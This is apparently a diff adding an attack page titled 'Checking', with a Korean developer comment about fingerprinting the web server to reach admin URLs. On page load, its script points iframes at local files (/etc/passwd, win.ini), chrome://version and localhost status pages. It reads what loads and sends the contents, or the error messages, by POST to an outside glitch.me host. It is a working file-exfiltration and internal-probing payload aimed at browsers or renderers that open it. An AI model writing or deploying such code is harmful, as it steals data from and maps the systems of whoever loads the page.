@@ -1,0 +1,186 @@
+
+<!-- 
+ERROR 
+webserver를 판별하여 해당하는 관리url로 접속을 하려했는데 SOP에 의해 iframe에 접근하지 못함
+그래서 가능성 있는 url을 모두 테스트해보는 수밖에 
+-->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Checking</title>
+    <script>
+
+      
+      document.addEventListener('DOMContentLoaded', function() {
+            var platform = navigator.platform;
+            var userAgent = navigator.userAgent;
+            var uaOs;
+            var webServer = "unknown";
+        
+            // OS from User-agent
+            if (userAgent.includes('Windows')) {
+                uaOs = 'Windows';
+            } else if (userAgent.includes('Linux')) {
+                uaOs = 'Linux';
+            }
+
+             // OS 
+            if (platform.includes('Win')) {
+                platform = 'Windows';
+            } else if (platform.includes('Linux')) {
+                platform = 'Linux';
+            } else {
+                platform = uaOs;
+            }
+        
+            // logging OS, browser version
+            console.log("Platform: " + platform);
+            console.log("User-Agent: " + userAgent);
+            console.log("Determined OS: " + uaOs);
+
+            // set iframe src
+            if (platform == "Linux" ){
+              document.getElementById('iframe1').src  = 'file:///etc/passwd';
+              document.getElementById('iframe11').src = 'https://artistic-spiny-network.glitch.me/checkrdrt_file_l.html';
+              
+            }   
+            else{
+              document.getElementById('iframe1').src  = 'file:///C://Windows//win.ini';
+              document.getElementById('iframe11').src = 'https://artistic-spiny-network.glitch.me/checkrdrt_file_w.html';
+            }                
+        
+            document.getElementById('iframe4').src    = 'chrome://version';
+
+            document.getElementById('iframe12').src   = 'https://artistic-spiny-network.glitch.me/checkrdrt_127.html';
+
+        
+            // iframe1 onload    
+            var iframe1 = document.getElementById('iframe1');
+            iframe1.onload = function() {
+                var iframeContent = iframe1.contentWindow.document.body.innerHTML;
+              
+                console.dir("file!!");
+                //transfer data
+                sendDataToServer(document.getElementById('iframe1').src , iframeContent);
+            };
+
+        
+            // load iframe
+            function loadIframe(iframeId, url) {
+                return new Promise((resolve, reject) => {
+                    var iframe = document.getElementById(iframeId);
+                    iframe.onload = function() {
+                      
+                        try {
+                            // access iframe
+                            var content = iframe.contentWindow.document || iframe.contentDocument;
+                            if (content.location.href === 'about:blank') {
+                                throw new Error('Iframe failed to load: ' + url);
+                            }
+
+                            //transfer data
+                            sendDataToServer(iframe.src, content.body.innerHTML);
+                          
+                            // success
+                            resolve(content.body.innerHTML.toLowerCase());
+                        } catch (error) {
+                            // error
+                            //reject(error);
+                            
+                            //console.dir(error);
+                            sendDataToServer(iframe.src, error);
+                            resolve(error.toString());
+                        }
+
+                    };
+                    iframe.onerror = reject;
+                    iframe.src = url;
+                });
+            }
+
+            // iframe2_1, iframe2, iframe3 order 
+            loadIframe('iframe2_1', 'http://127.0.0.1/qwer.html')
+                .then(iframe2_1Content => {
+                    if (iframe2_1Content.includes('apache')) {
+                        webServer = "apache";
+                    } else if (iframe2_1Content.includes('nginx')) {
+                        webServer = "nginx";
+                    } else {
+                        webServer = "unknown";
+                    }
+                    //console.log("1" + webServer);
+                    return loadIframe('iframe2', 'http://127.0.0.1');
+                })
+                .then(iframe2Content => {
+                    if (webServer == 'unknown') {
+                        if (iframe2Content.includes('apache')) {
+                            webServer = "apache";
+                        } else if (iframe2Content.includes('nginx')) {
+                            webServer = "nginx";
+                        }
+                    }
+
+                    //console.log("2" + webServer);
+              
+                    //transfer data
+                    //sendDataToServer('http://127.0.0.1', iframe2Content);
+
+                    var nextUrl = (webServer == "apache") ? 'http://127.0.0.1/server-status' : 
+                                 (webServer == "nginx") ? 'http://127.0.0.1/nginx_status' : 
+                                 'about:blank'; // default
+                                 // 'http://127.0.0.1/index1.html'
+
+                    return loadIframe('iframe3', nextUrl);
+                })
+                .then(iframe3Content => {
+
+                    //console.dir("server-manage!!");
+                    //transfer data
+                    //sendDataToServer(nextUrl, iframe3Content);
+                })
+                .catch(error => {
+                    console.error('Error loading iframe:', error);
+                });
+
+        
+      });
+
+      
+    // Transfer data to server
+    function sendDataToServer(url, data) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://artistic-spiny-network.glitch.me/receive', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === XMLHttpRequest.DONE) {
+                // process data
+                if (xhr.status === 200) {
+                    console.log('send data');
+                } else {
+                    console.log('Errors in transit');
+                }
+            }
+        };
+
+        // trans data (json)
+        xhr.send(JSON.stringify({ url: url, data: data }));
+    }
+
+    </script>
+</head>
+<body>
+    <h1>Checking</h1>
+    <iframe id="iframe1" width="300" height="200"></iframe>
+    <iframe id="iframe2_1" width="300" height="200"></iframe>
+    <iframe id="iframe2" width="300" height="200"></iframe>
+    <iframe id="iframe3" width="300" height="200"></iframe>
+    <iframe id="iframe4" width="300" height="200"></iframe>
+  
+    <iframe id="iframe11" width="300" height="200"></iframe>
+    <iframe id="iframe12" width="300" height="200"></iframe>
+    <iframe id="iframe13" width="300" height="200"></iframe>
+</body>
+</html>
